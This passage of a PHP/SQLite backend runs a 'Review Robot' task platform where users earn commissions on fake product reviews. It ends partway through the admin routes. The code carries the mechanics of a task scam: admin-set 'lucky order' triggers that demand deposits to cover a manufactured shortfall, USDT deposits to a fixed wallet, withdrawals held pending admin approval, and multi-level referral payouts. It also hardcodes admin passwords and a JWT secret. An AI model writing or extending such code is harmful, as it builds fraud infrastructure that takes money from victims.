<?php
// ====================================================================
// REVIEW ROBOT - UNIVERSAL SHARED HOSTING API BACKEND (PHP 8.4 + SQLite)
// Zero-daemon, runs natively on Apache/cPanel shared hosting out of the box
// ====================================================================

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// --------------------------------------------------------------------
// 1. DATABASE CONNECTION & INITIALIZATION
// --------------------------------------------------------------------
$dbPath = __DIR__ . '/platform.db';
$db = new PDO('sqlite:' . $dbPath);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

// Initialize Tables
$db->exec("
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        withdrawal_pin TEXT DEFAULT '123456',
        invite_code TEXT UNIQUE NOT NULL,
        invited_by TEXT,
        balance REAL DEFAULT 200.00,
        frozen_balance REAL DEFAULT 0.00,
        team_commission_unclaimed REAL DEFAULT 0.00,
        completed_tasks INTEGER DEFAULT 0,
        max_daily_tasks INTEGER DEFAULT 60,
        vip_level INTEGER DEFAULT 1,
        trc20_address TEXT DEFAULT '',
        status TEXT DEFAULT 'active',
        created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        price REAL NOT NULL,
        commission_rate REAL DEFAULT 0.006,
        image_url TEXT NOT NULL,
        category TEXT DEFAULT 'Electronics'
    );

    CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        order_no TEXT UNIQUE NOT NULL,
        user_id INTEGER NOT NULL,
        product_id INTEGER,
        product_name TEXT NOT NULL,
        product_image TEXT NOT NULL,
        amount REAL NOT NULL,
        commission REAL NOT NULL,
        status TEXT DEFAULT 'completed',
        is_lucky_order INTEGER DEFAULT 0,
        created_at TEXT NOT NULL,
        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS lucky_order_triggers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        trigger_type TEXT DEFAULT 'next',
        target_task_number INTEGER,
        amount REAL NOT NULL,
        expected_return REAL NOT NULL,
        product_name TEXT,
        is_active INTEGER DEFAULT 1,
        created_at TEXT NOT NULL,
        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS recharges (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        amount REAL NOT NULL,
        txid TEXT,
        proof_image TEXT,
        status TEXT DEFAULT 'pending',
        admin_notes TEXT DEFAULT '',
        created_at TEXT NOT NULL,
        processed_at TEXT,
        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        amount REAL NOT NULL,
        trc20_address TEXT NOT NULL,
        fee REAL DEFAULT 0.0,
        actual_amount REAL NOT NULL,
        status TEXT DEFAULT 'pending',
        admin_notes TEXT DEFAULT '',
        created_at TEXT NOT NULL,
        processed_at TEXT,
        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS system_settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS admins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'superadmin',
        created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS admin_invite_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code TEXT UNIQUE NOT NULL,
        bonus_balance REAL DEFAULT 200.00,
        max_uses INTEGER DEFAULT 1,
        used_count INTEGER DEFAULT 0,
        vip_level INTEGER DEFAULT 1,
        status TEXT DEFAULT 'active',
        created_by TEXT DEFAULT 'admin',
        created_at TEXT NOT NULL
    );
");

// Migration: Ensure role column in admins
try {
    $db->exec("ALTER TABLE admins ADD COLUMN role TEXT DEFAULT 'superadmin';");
} catch (Exception $e) {}

// Seed Defaults Settings
$defaults = [
    'platform_name' => 'Review Robot - xinmingzhi',
    'trc20_deposit_address' => 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s',
    'min_deposit' => '20',
    'min_withdraw' => '30',
    'default_commission_rate' => '0.006',
    'default_daily_tasks' => '60',
    'customer_service_url' => 'https://t.me/review_robot_support',
    'admin_secret_path' => '/secret-admin-portal-xyz',
    'referral_commission_l1' => '0.16',
    'referral_commission_l2' => '0.08',
    'referral_commission_l3' => '0.04'
];
$stmtCheckSetting = $db->prepare("SELECT value FROM system_settings WHERE key = ?");
$stmtInsertSetting = $db->prepare("INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)");
foreach ($defaults as $k => $v) {
    $stmtCheckSetting->execute([$k]);
    if (!$stmtCheckSetting->fetch()) {
        $stmtInsertSetting->execute([$k, $v]);
    }
}

// Seed Default Admins
$now = date('Y-m-d H:i:s');
$checkAdmin = $db->prepare("SELECT id FROM admins WHERE username = ?");
$insertAdmin = $db->prepare("INSERT INTO admins (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)");

$adminList = [
    ['admin', 'Admin@2026!Master', 'superadmin'],
    ['ops_manager', 'Manager@2026!Pass', 'manager'],
    ['finance_lead', 'Finance@2026!Pass', 'finance']
];
foreach ($adminList as $a) {
    $checkAdmin->execute([$a[0]]);
    if (!$checkAdmin->fetch()) {
        $insertAdmin->execute([$a[0], password_hash($a[1], PASSWORD_BCRYPT), $a[2], $now]);
    }
}

// Seed Demo Users if empty
$userCount = $db->query("SELECT COUNT(*) FROM users")->fetchColumn();
if ($userCount == 0) {
    $insertUser = $db->prepare("INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, balance, completed_tasks, max_daily_tasks, vip_level, trc20_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $insertUser->execute(['demo_user', password_hash('123456', PASSWORD_BCRYPT), '123456', 'VIP6688', 201.08, 1, 60, 1, 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s', $now]);
    $insertUser->execute(['Rosy', password_hash('123456', PASSWORD_BCRYPT), '123456', 'ROSY88', 250.00, 5, 60, 1, '', $now]);
}

// Seed Initial Admin Invite Codes if empty
$codeCount = $db->query("SELECT COUNT(*) FROM admin_invite_codes")->fetchColumn();
if ($codeCount == 0) {
    $insertCode = $db->prepare("INSERT INTO admin_invite_codes (code, bonus_balance, max_uses, used_count, vip_level, status, created_by, created_at) VALUES (?, ?, ?, 0, ?, 'active', 'admin', ?)");
    $insertCode->execute(['VIP2026', 200.00, 0, 1, $now]);
    $insertCode->execute(['PRO777', 300.00, 5, 2, $now]);
    $insertCode->execute(['GOLD888', 500.00, 1, 3, $now]);
}

// Seed Latest Products if empty
$prodCount = $db->query("SELECT COUNT(*) FROM products")->fetchColumn();
if ($prodCount == 0) {
    $products = [
        ['Sony PlayStation 5 Pro Console 2TB SSD with DualSense Wireless Controller', 699.99, 0.006, 'https://images.unsplash.com/photo-1606813907291-d86efa9b94db?w=300', 'Gaming Consoles'],
        ['Apple iPhone 16 Pro Max 256GB Desert Titanium (Unlocked)', 1199.00, 0.006, 'https://images.unsplash.com/photo-1510557880182-3d4d3cba35a5?w=300', 'Smartphones'],
        ['Apple iPhone 16 128GB Teal with Camera Control and 48MP Fusion Camera', 799.00, 0.006, 'https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=300', 'Smartphones'],
        ['Samsung Galaxy S24 Ultra 512GB Titanium Gray with Galaxy AI & S-Pen', 1299.99, 0.006, 'https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?w=300', 'Smartphones'],
        ['Apple MacBook Air 15" M3 Chip 16GB Unified Memory 512GB SSD Midnight', 1499.00, 0.006, 'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=300', 'Laptops & Computers'],
        ['Apple AirPods Max Wireless Over-Ear Headphones with Active Noise Cancellation Space Gray', 549.00, 0.006, 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=300', 'Audio & Headphones'],
        ['PlayStation VR2 Headset and PlayStation VR2 Sense Controller Horizon Bundle', 599.99, 0.006, 'https://images.unsplash.com/photo-1622979135225-d2ba269bc1df?w=300', 'Virtual Reality'],
        ['ASUS ROG Ally X 7" 120Hz FHD Handheld Gaming Console 24GB LPDDR5X 1TB SSD', 799.99, 0.006, 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=300', 'Gaming Consoles'],
        ['Nintendo Switch - OLED Model with White Joy-Con', 349.99, 0.006, 'https://images.unsplash.com/photo-1578303512597-81e6cc155b3e?w=300', 'Gaming Consoles'],
        ['Meta Quest 3 512GB Breakthrough Mixed Reality All-in-One Headset', 649.99, 0.006, 'https://images.unsplash.com/photo-1593508512255-86ab42a8e620?w=300', 'Virtual Reality'],
        ['Dyson V15 Detect Cordless Vacuum Cleaner with Laser Dust Detection', 749.99, 0.006, 'https://images.unsplash.com/photo-1558317374-067fb5f30001?w=300', 'Home Appliances'],
        ['Sony WH-1000XM5 Wireless Noise Canceling Headphones', 398.00, 0.006, 'https://images.unsplash.com/photo-1583394838336-acd977736f90?w=300', 'Audio & Headphones'],
        ['DJI Mini 2 SE Lightweight Foldable Drone w/ 2.7K Camera', 299.00, 0.006, 'https://images.unsplash.com/photo-1508614589041-895b88991e3e?w=300', 'Drones & Cameras'],
        ['AutoCAD Electrical for Electrical and Automation Engineers', 99.00, 0.006, 'https://images.unsplash.com/photo-1581291518857-4e27b48ff24e?w=300', 'Software'],
        ['DVa Cosplay Headset | Officer Dva headset props', 114.00, 0.006, 'https://images.unsplash.com/photo-1546435770-a3e426bf472b?w=300', 'Consumer Electronics'],
        ['SAMSUNG Galaxy Tab A7 Lite 8.7" 32GB WiFi Android Tablet', 139.00, 0.006, 'https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=300', 'Computers & Tablets'],
        ['Logitech MX Master 3S Wireless Performance Ergonomic Mouse', 99.99, 0.006, 'https://images.unsplash.com/photo-1527864550417-7fd91fc51a46?w=300', 'Accessories']
    ];
    $insertProduct = $db->prepare("INSERT INTO products (name, price, commission_rate, image_url, category) VALUES (?, ?, ?, ?, ?)");
    foreach ($products as $p) {
        $insertProduct->execute($p);
    }
}

// --------------------------------------------------------------------
// 2. HELPER FUNCTIONS & AUTHENTICATION
// --------------------------------------------------------------------
$JWT_SECRET = 'super-secret-key-review-robot-2026';

function generateToken($data, $secret) {
    $header = base64_encode(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
    $payload = base64_encode(json_encode(array_merge($data, ['exp' => time() + 86400 * 7])));
    $signature = hash_hmac('sha256', "$header.$payload", $secret, true);
    return "$header.$payload." . base64_encode($signature);
}

function verifyToken($token, $secret) {
    if (!$token) return null;
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    [$header, $payload, $sig] = $parts;
    $validSig = base64_encode(hash_hmac('sha256', "$header.$payload", $secret, true));
    if (!hash_equals($validSig, $sig)) return null;
    $data = json_decode(base64_decode($payload), true);
    if (!$data || (isset($data['exp']) && $data['exp'] < time())) return null;
    return $data;
}

function getBearerToken() {
    $headers = apache_request_headers();
    $auth = $headers['Authorization'] ?? $headers['authorization'] ?? $_SERVER['HTTP_AUTHORIZATION'] ?? '';
    if (preg_match('/Bearer\s+(.*)$/i', $auth, $matches)) {
        return trim($matches[1]);
    }
    return '';
}

function requireUserAuth($db, $secret) {
    $token = getBearerToken();
    $data = verifyToken($token, $secret);
    if (!$data || !isset($data['id'])) {
        http_response_code(401);
        echo json_encode(['success' => false, 'message' => 'Unauthorized or session expired.']);
        exit;
    }
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$data['id']]);
    $user = $stmt->fetch();
    if (!$user || $user['status'] === 'suspended') {
        http_response_code(401);
        echo json_encode(['success' => false, 'message' => 'Account is inactive or suspended.']);
        exit;
    }
    return $user;
}

function requireAdminAuth($db, $secret, $allowedRoles = []) {
    $token = getBearerToken();
    $data = verifyToken($token, $secret);
    if (!$data || !isset($data['adminId'])) {
        http_response_code(401);
        echo json_encode(['success' => false, 'message' => 'Admin authorization required.']);
        exit;
    }
    $stmt = $db->prepare("SELECT * FROM admins WHERE id = ?");
    $stmt->execute([$data['adminId']]);
    $admin = $stmt->fetch();
    if (!$admin) {
        http_response_code(401);
        echo json_encode(['success' => false, 'message' => 'Admin account not found.']);
        exit;
    }
    if (!empty($allowedRoles) && !in_array($admin['role'], $allowedRoles)) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "Access denied. Required role: " . implode(', ', $allowedRoles)]);
        exit;
    }
    return $admin;
}

function getJsonInput() {
    $raw = file_get_contents('php://input');
    return json_decode($raw, true) ?? [];
}

function generateRandomCode($len = 8) {
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $res = '';
    for ($i = 0; $i < $len; $i++) {
        $res .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $res;
}

// --------------------------------------------------------------------
// 3. REQUEST ROUTER
// --------------------------------------------------------------------
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
// Normalize URI: strip /api prefix
$route = preg_replace('#^/api#', '', $uri);
$route = rtrim($route, '/');
if ($route === '') $route = '/';
$method = $_SERVER['REQUEST_METHOD'];

// Route Matching Dispatcher
try {
    // ----------------- SYSTEM PUBLIC CONFIG -----------------
    if ($method === 'GET' && $route === '/system/public-config') {
        $stmt = $db->query("SELECT key, value FROM system_settings");
        $settings = [];
        while ($row = $stmt->fetch()) {
            $settings[$row['key']] = $row['value'];
        }
        echo json_encode([
            'success' => true,
            'platform_name' => $settings['platform_name'] ?? 'Review Robot',
            'trc20_deposit_address' => $settings['trc20_deposit_address'] ?? 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s',
            'min_deposit' => floatval($settings['min_deposit'] ?? 20),
            'min_withdraw' => floatval($settings['min_withdraw'] ?? 30),
            'customer_service_url' => $settings['customer_service_url'] ?? 'https://t.me/review_robot_support'
        ]);
        exit;
    }

    // ----------------- USER AUTH: LOGIN -----------------
    if ($method === 'POST' && $route === '/auth/login') {
        $body = getJsonInput();
        $username = trim($body['username'] ?? '');
        $password = $body['password'] ?? '';

        $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch();

        if (!$user || !password_verify($password, $user['password_hash'])) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Invalid username or password.']);
            exit;
        }

        if ($user['status'] === 'suspended') {
            http_response_code(403);
            echo json_encode(['success' => false, 'message' => 'Account is suspended. Please contact customer service.']);
            exit;
        }

        $token = generateToken(['id' => $user['id'], 'username' => $user['username']], $JWT_SECRET);
        unset($user['password_hash']);
        echo json_encode(['success' => true, 'token' => $token, 'user' => $user]);
        exit;
    }

    // ----------------- USER AUTH: REGISTER -----------------
    if ($method === 'POST' && $route === '/auth/register') {
        $body = getJsonInput();
        $username = trim($body['username'] ?? '');
        $password = $body['password'] ?? '';
        $inviteCodeInput = strtoupper(trim($body['invite_code'] ?? ''));
        $pin = $body['withdrawal_pin'] ?? '123456';

        if (strlen($username) < 3 || strlen($password) < 6) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Username min 3 chars, password min 6 chars.']);
            exit;
        }

        if (empty($inviteCodeInput)) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'An invitation code or VIP promo code is mandatory to register.']);
            exit;
        }

        // Check if username taken
        $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
        $stmt->execute([$username]);
        if ($stmt->fetch()) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Username already registered.']);
            exit;
        }

        // Validate invite code: either admin promo token OR existing user referral code
        $inviter = null;
        $bonusBalance = 200.00;
        $vipLevel = 1;
        $adminCodeId = null;

        $stmtAdminCode = $db->prepare("SELECT * FROM admin_invite_codes WHERE code = ? AND status = 'active'");
        $stmtAdminCode->execute([$inviteCodeInput]);
        $adminCode = $stmtAdminCode->fetch();

        if ($adminCode) {
            if ($adminCode['max_uses'] > 0 && $adminCode['used_count'] >= $adminCode['max_uses']) {
                http_response_code(400);
                echo json_encode(['success' => false, 'message' => 'This VIP promo code has reached its maximum usage limit.']);
                exit;
            }
            $bonusBalance = floatval($adminCode['bonus_balance']);
            $vipLevel = intval($adminCode['vip_level']);
            $adminCodeId = $adminCode['id'];
        } else {
            $stmtUserCode = $db->prepare("SELECT username FROM users WHERE invite_code = ?");
            $stmtUserCode->execute([$inviteCodeInput]);
            $inviterUser = $stmtUserCode->fetch();
            if (!$inviterUser) {
                http_response_code(400);
                echo json_encode(['success' => false, 'message' => 'Invalid invitation code. Please verify code.']);
                exit;
            }
            $inviter = $inviterUser['username'];
        }

        // Generate unique invite code for new user
        $myCode = generateRandomCode(8);
        $stmtCodeCheck = $db->prepare("SELECT id FROM users WHERE invite_code = ?");
        while (true) {
            $stmtCodeCheck->execute([$myCode]);
            if (!$stmtCodeCheck->fetch()) break;
            $myCode = generateRandomCode(8);
        }

        $now = date('Y-m-d H:i:s');
        $hash = password_hash($password, PASSWORD_BCRYPT);
        $insert = $db->prepare("
            INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, invited_by, balance, completed_tasks, max_daily_tasks, vip_level, trc20_address, created_at)
            VALUES (?, ?, ?, ?, ?, ?, 0, 60, ?, '', ?)
        ");
        $insert->execute([$username, $hash, $pin, $myCode, $inviter, $bonusBalance, $vipLevel, $now]);
        $newUserId = $db->lastInsertId();

        if ($adminCodeId) {
            $db->prepare("UPDATE admin_invite_codes SET used_count = used_count + 1 WHERE id = ?")->execute([$adminCodeId]);
        }

        $stmtNew = $db->prepare("SELECT id, username, invite_code, balance, vip_level, created_at FROM users WHERE id = ?");
        $stmtNew->execute([$newUserId]);
        $newUser = $stmtNew->fetch();

        $token = generateToken(['id' => $newUser['id'], 'username' => $newUser['username']], $JWT_SECRET);
        echo json_encode([
            'success' => true,
            'message' => "Welcome to Review Robot! Starting balance of {$bonusBalance} USDT credited.",
            'token' => $token,
            'user' => $newUser
        ]);
        exit;
    }

    // ----------------- USER PROFILE -----------------
    if ($method === 'GET' && $route === '/user/profile') {
        $user = requireUserAuth($db, $JWT_SECRET);
        unset($user['password_hash']);
        echo json_encode(['success' => true, 'user' => $user]);
        exit;
    }

    if ($method === 'POST' && $route === '/user/update-trc20') {
        $user = requireUserAuth($db, $JWT_SECRET);
        $body = getJsonInput();
        $addr = trim($body['trc20_address'] ?? '');
        if (strlen($addr) < 20) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Please provide a valid TRC-20 wallet address.']);
            exit;
        }
        $db->prepare("UPDATE users SET trc20_address = ? WHERE id = ?")->execute([$addr, $user['id']]);
        echo json_encode(['success' => true, 'message' => 'TRC-20 address successfully updated!']);
        exit;
    }

    // ----------------- TRADE: STATUS -----------------
    if ($method === 'GET' && $route === '/trade/status') {
        $user = requireUserAuth($db, $JWT_SECRET);
        echo json_encode([
            'success' => true,
            'balance' => floatval($user['balance']),
            'completed_tasks' => intval($user['completed_tasks']),
            'total_task' => intval($user['max_daily_tasks']),
            'vip_level' => intval($user['vip_level'])
        ]);
        exit;
    }

    // ----------------- TRADE: START MATCHING -----------------
    if ($method === 'POST' && $route === '/trade/start-matching') {
        $user = requireUserAuth($db, $JWT_SECRET);

        // Check task quota
        if ($user['completed_tasks'] >= $user['max_daily_tasks']) {
            echo json_encode([
                'success' => false,
                'code' => 'QUOTA_REACHED',
                'message' => 'You have completed all daily review tasks. Please check back tomorrow!'
            ]);
            exit;
        }

        // Check if lucky order trigger exists
        $stmtLucky = $db->prepare("SELECT * FROM lucky_order_triggers WHERE user_id = ? AND is_active = 1 ORDER BY id ASC LIMIT 1");
        $stmtLucky->execute([$user['id']]);
        $trigger = $stmtLucky->fetch();

        if ($trigger) {
            $userBal = floatval($user['balance']);
            $orderAmt = floatval($trigger['amount']);
            $diff = round($orderAmt - $userBal, 2);

            if ($diff > 0) {
                echo json_encode([
                    'success' => true,
                    'is_lucky_order' => true,
                    'insufficient_balance' => true,
                    'difference' => $diff,
                    'order' => [
                        'amount' => $orderAmt,
                        'expected_return' => floatval($trigger['expected_return']),
                        'transaction_hour' => date('Y-m-d H:i:s'),
                        'product_name' => $trigger['product_name'] ?: 'Sony PlayStation 5 Pro & PS VR2 Master Combo Bundle'
                    ]
                ]);
                exit;
            }
        }

        // Normal matching: pick product
        $stmtProd = $db->query("SELECT * FROM products ORDER BY RANDOM() LIMIT 1");
        $product = $stmtProd->fetch();
        if (!$product) {
            echo json_encode(['success' => false, 'message' => 'Product pool empty.']);
            exit;
        }

        $price = floatval($product['price']);
        $comm = round($price * floatval($product['commission_rate']), 2);

        echo json_encode([
            'success' => true,
            'product' => [
                'id' => $product['id'],
                'name' => $product['name'],
                'price' => $price,
                'expected_return' => $comm,
                'image_url' => $product['image_url'],
                'transaction_hour' => date('Y-m-d H:i:s')
            ]
        ]);
        exit;
    }

    // ----------------- TRADE: SUBMIT ORDER -----------------
    if ($method === 'POST' && $route === '/trade/submit-order') {
        $user = requireUserAuth($db, $JWT_SECRET);
        $body = getJsonInput();

        $prodName = $body['product_name'] ?? 'Product';
        $prodImg = $body['product_image'] ?? '';
        $amount = floatval($body['amount'] ?? 0);
        $comm = floatval($body['expected_return'] ?? 0);

        $orderNo = 'ORD' . date('YmdHis') . random_int(100, 999);
        $now = date('Y-m-d H:i:s');

        // Create completed order and credit commission
        $db->prepare("
            INSERT INTO orders (order_no, user_id, product_name, product_image, amount, commission, status, is_lucky_order, created_at)
            VALUES (?, ?, ?, ?, ?, ?, 'completed', 0, ?)
        ")->execute([$orderNo, $user['id'], $prodName, $prodImg, $amount, $comm, $now]);

        $newBal = round(floatval($user['balance']) + $comm, 2);
        $newTasks = intval($user['completed_tasks']) + 1;

        $db->prepare("UPDATE users SET balance = ?, completed_tasks = ? WHERE id = ?")->execute([$newBal, $newTasks, $user['id']]);

        // Referral commission kickback to inviter
        if (!empty($user['invited_by'])) {
            $refComm = round($comm * 0.16, 2);
            $db->prepare("UPDATE users SET team_commission_unclaimed = team_commission_unclaimed + ? WHERE username = ?")->execute([$refComm, $user['invited_by']]);
        }

        echo json_encode([
            'success' => true,
            'message' => 'Order submitted successfully!',
            'new_balance' => $newBal,
            'completed_tasks' => $newTasks
        ]);
        exit;
    }

    // ----------------- TEAM: INFO & COMMISSION -----------------
    if ($method === 'GET' && $route === '/team/info') {
        $user = requireUserAuth($db, $JWT_SECRET);

        $stmt = $db->prepare("SELECT username, balance, completed_tasks, status FROM users WHERE invited_by = ? ORDER BY id DESC");
        $stmt->execute([$user['invite_code']]);
        $team = [];
        while ($m = $stmt->fetch()) {
            $team[] = [
                'username' => $m['username'],
                'contributions' => round(floatval($m['balance']) * 0.05, 2),
                'state' => $m['status'] === 'active' ? 'Normal' : 'Disabled'
            ];
        }

        echo json_encode([
            'success' => true,
            'balance' => floatval($user['balance']),
            'commission' => floatval($user['team_commission_unclaimed'] ?? 0),
            'total_people' => count($team),
            'invite_code' => $user['invite_code'],
            'team' => $team
        ]);
        exit;
    }

    if ($method === 'POST' && ($route === '/team/claim-commission' || $route === '/team/receive-commission')) {
        $user = requireUserAuth($db, $JWT_SECRET);
        $unclaimed = floatval($user['team_commission_unclaimed'] ?? 0);
        if ($unclaimed <= 0) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'No commission available to receive.']);
            exit;
        }

        $newBal = round(floatval($user['balance']) + $unclaimed, 2);
        $db->prepare("UPDATE users SET balance = ?, team_commission_unclaimed = 0.00 WHERE id = ?")->execute([$newBal, $user['id']]);

        echo json_encode(['success' => true, 'message' => "Received {$unclaimed} USDT commission!", 'new_balance' => $newBal]);
        exit;
    }

    // ----------------- RECHARGE: INFO & SUBMIT -----------------
    if ($method === 'GET' && $route === '/recharge/info') {
        requireUserAuth($db, $JWT_SECRET);
        $stmt = $db->prepare("SELECT value FROM system_settings WHERE key = 'trc20_deposit_address'");
        $stmt->execute();
        $addr = $stmt->fetchColumn() ?: 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s';

        echo json_encode([
            'success' => true,
            'deposit_address' => $addr,
            'qr_code' => "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" . urlencode($addr),
            'instruction' => 'The deposit address only supports TRC20-USDT, and the minimum deposit amount is 20USDT'
        ]);
        exit;
    }

    if ($method === 'POST' && $route === '/recharge/submit') {
        $user = requireUserAuth($db, $JWT_SECRET);
        $amount = floatval($_POST['amount'] ?? 0);
        $txid = trim($_POST['txid'] ?? '');

        if ($amount < 20) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Minimum deposit amount is 20 USDT.']);
            exit;
        }

        $now = date('Y-m-d H:i:s');
        $db->prepare("INSERT INTO recharges (user_id, amount, txid, status, created_at) VALUES (?, ?, ?, 'pending', ?)")
           ->execute([$user['id'], $amount, $txid, $now]);

        echo json_encode(['success' => true, 'message' => 'Deposit voucher submitted! Awaiting administrator confirmation.']);
        exit;
    }

    // ----------------- ORDERS LIST -----------------
    if ($method === 'GET' && $route === '/orders') {
        $user = requireUserAuth($db, $JWT_SECRET);
        $status = $_GET['status'] ?? 'all';

        if ($status === 'all') {
            $stmt = $db->prepare("SELECT * FROM orders WHERE user_id = ? ORDER BY id DESC");
            $stmt->execute([$user['id']]);
        } else {
            $stmt = $db->prepare("SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY id DESC");
            $stmt->execute([$user['id'], $status]);
        }
        $orders = $stmt->fetchAll();
        echo json_encode(['success' => true, 'orders' => $orders]);
        exit;
    }

    // ----------------- WITHDRAWAL SUBMIT -----------------
    if ($method === 'POST' && $route === '/withdraw/submit') {
        $user = requireUserAuth($db, $JWT_SECRET);
        $body = getJsonInput();

        $amount = floatval($body['amount'] ?? 0);
        $pin = $body['withdrawal_pin'] ?? '';
        $addr = trim($body['trc20_address'] ?? $user['trc20_address']);

        if ($amount < 30) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Minimum withdrawal is 30 USDT.']);
            exit;
        }

        if ($amount > floatval($user['balance'])) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Insufficient available balance.']);
            exit;
        }

        if ($user['withdrawal_pin'] && $user['withdrawal_pin'] !== $pin) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Incorrect withdrawal PIN.']);
            exit;
        }

        $now = date('Y-m-d H:i:s');
        $newBal = round(floatval($user['balance']) - $amount, 2);
        $newFrozen = round(floatval($user['frozen_balance']) + $amount, 2);

        $db->prepare("UPDATE users SET balance = ?, frozen_balance = ? WHERE id = ?")->execute([$newBal, $newFrozen, $user['id']]);
        $db->prepare("INSERT INTO withdrawals (user_id, amount, trc20_address, actual_amount, status, created_at) VALUES (?, ?, ?, ?, 'pending', ?)")
           ->execute([$user['id'], $amount, $addr, $amount, $now]);

        echo json_encode(['success' => true, 'message' => "Withdrawal request for {$amount} USDT submitted successfully."]);
        exit;
    }

    // =================================================================
    // 4. ADMIN HQ CONTROL ROUTES
    // =================================================================
    if ($method === 'POST' && $route === '/admin/login') {
        $body = getJsonInput();
        $username = trim($body['username'] ?? '');
        $password = $body['password'] ?? '';

        $stmt = $db->prepare("SELECT * FROM admins WHERE username = ?");
        $stmt->execute([$username]);
        $admin = $stmt->fetch();

        if (!$admin || !password_verify($password, $admin['password_hash'])) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Invalid admin credentials.']);
            exit;
        }

        $token = generateToken(['adminId' => $admin['id'], 'username' => $admin['username'], 'role' => $admin['role']], $JWT_SECRET);
        unset($admin['password_hash']);
        echo json_encode(['success' => true, 'token' => $token, 'admin' => $admin]);
        exit;
    }

    // Admin Dashboard Stats
    if ($method === 'GET' && $route === '/admin/dashboard-stats') {
        requireAdminAuth($db, $JWT_SECRET);
        $totalUsers = $db->query("SELECT COUNT(*) FROM users")->fetchColumn();
        $totalBal = $db->query("SELECT COALESCE(SUM(balance), 0) FROM users")->fetchColumn();
        $pendingRecharges = $db->query("SELECT COUNT(*) FROM recharges WHERE status = 'pending'")->fetchColumn();
        $pendingWithdrawals = $db->query("SELECT COUNT(*) FROM withdrawals WHERE status = 'pending'")->fetchColumn();
        $completedOrders = $db->query("SELECT COUNT(*) FROM orders WHERE status = 'completed'")->fetchColumn();
        $activeLucky = $db->query("SELECT COUNT(*) FROM lucky_order_triggers WHERE is_active = 1")->fetchColumn();
        $activeTokens = $db->query("SELECT COUNT(*) FROM admin_invite_codes WHERE status = 'active'")->fetchColumn();

        echo json_encode([
            'success' => true,
            'stats' => [
                'total_users' => intval($totalUsers),
                'total_user_balance' => round(floatval($totalBal), 2),
                'pending_recharges' => intval($pendingRecharges),
                'pending_withdrawals' => intval($pendingWithdrawals),
                'completed_orders' => intval($completedOrders),
                'active_lucky_triggers' => intval($activeLucky),
                'active_tokens' => intval($activeTokens)
            ]
        ]);
        exit;
    }

    // Admin Users List & Creation
    if ($method === 'GET' && $route === '/admin/users') {
        requireAdminAuth($db, $JWT_SECRET);
